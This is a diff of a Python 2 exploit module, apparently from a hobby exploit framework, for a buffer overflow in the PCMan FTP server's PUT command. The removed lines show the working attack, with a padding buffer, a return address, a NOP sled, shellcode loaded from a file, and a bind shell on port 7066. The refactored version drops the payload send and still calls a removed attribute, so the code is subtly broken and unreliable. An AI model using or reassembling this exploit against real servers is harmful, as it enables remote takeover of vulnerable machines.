@@ -1,10 +1,10 @@
 class Exploit(cmd.Cmd):
   def __init__(self):
     cmd.Cmd.__init__(self)
-    self.user = ["anonymous"]
-    self.passwd = ["anonymous@example.com"]
-    self.host = ["ftp.debian.org"]
+    self.variables = {"":""}
+    self.descriptions = {"":""}
     self.name = [""]
+    self.target = [""] 
   def help_help(self):
     print "Usage: help [cmd]"
     print "cmd    the command to get help on"
@@ -18,12 +18,9 @@ class Exploit(cmd.Cmd):
   def do_set(self, args):
     var = getToken(args)
     val = args[len(var) + 3:]
-    if var == "user":
-      self.user[0] = val
-    elif var == "passwd":
-      self.passwd[0] = val
-    elif var == "host":
-      self.host[0] = val
+    for variable in self.variables.keys():
+      if variable == var:
+        self.variables[variable] = val 
     else:
       print "*** Variable not found %s" % var
       return
@@ -34,15 +31,14 @@ class Exploit(cmd.Cmd):
   def do_show(self, args):
     if args != "options":
       print "*** Unknown argument: " + args
-    print "Target: Windows XP SP3 English"
+    print "Target: %s" % self.target[0]
     print "Options for %s:" % self.name[0]
     print "========================"
-    print "user    %s    the user to login in as" % self.user[0]
-    print "passwd    %s    the password of the user" % self.passwd[0]
-    print "host    %s    the IP of the target" % self.host[0]
+    for variable in self.variables.keys():
+      print "%s    %s    %s" % (variable, self.variables[variable], self.descriptions[variable])
   def help_exit(self):
     print "Usage: exit"
-    print "exit: exit the pcman_put_overflow context"
+    print "exit: exit the %s context" % self.name[0]
   def do_exit(self, args):
     if args:
       print "*** Argument number: needed 0"
@@ -54,22 +50,12 @@ class Exploit(cmd.Cmd):
   def do_start(self, args):
     for let in "abcdefghijklmnopqrstuvwxyz":
       if let in self.host[0]:
-        self.host[0] = gethostbyname(self.host[0])
-    ftp = ftplib.FTP(self.host[0])
-    try:
-     ftp.login(self.user[0], self.passwd[0])
-     print "[+]Login successful on %s" % self.host[0]
-    except:
-      print "[-]Login unsuccessful on %s" % self.host[0]
-      return
-    ftp.quit()
+        self.variables["host"] = gethostbyname(self.variables["host"])
     print "[*]Generating payload..."
     char = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "a", "b", "c", "d", "e", "f"]
     payload = ""
     for a in range(0, 2017):
       payload += "\x" + char[randint(0, 16)] + char[randint(0, 16)]
-    payload += "\x77\xc3\x54\x59"
-    payload += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
     f = open("../../../payloads/pcman_put.shell", "r")
     for line in f.readlines():
       payload += line[:-1].decode('string_escape')
@@ -77,12 +63,8 @@ class Exploit(cmd.Cmd):
     print "[+]Payload generated."
     print "[*]Sending payload of size: " + str(len(payload.encode('utf-8')))
     s = socket(AF_INET, SOCK_STREAM)
-    s.connect((self.host[0], 21))
-    s.recv(1024)
-    s.send("USER " + self.user[0])
-    s.recv(1024)
-    s.send("PASS " + self.passwd[0])
-    s.recv(1024)
-    s.send("PUT " + payload)\
+    s.connect((self.variables["host"], 21))
     s.close()
-    print "[+]Payload sent. Telnet to port 7066 on %s to get your shell. :)" % self.host[0]
+    print "[+]Payload sent."
+    print "[*]Connecting..."
+    os.system("telnet %s 7066" % self.variables["host"]) 
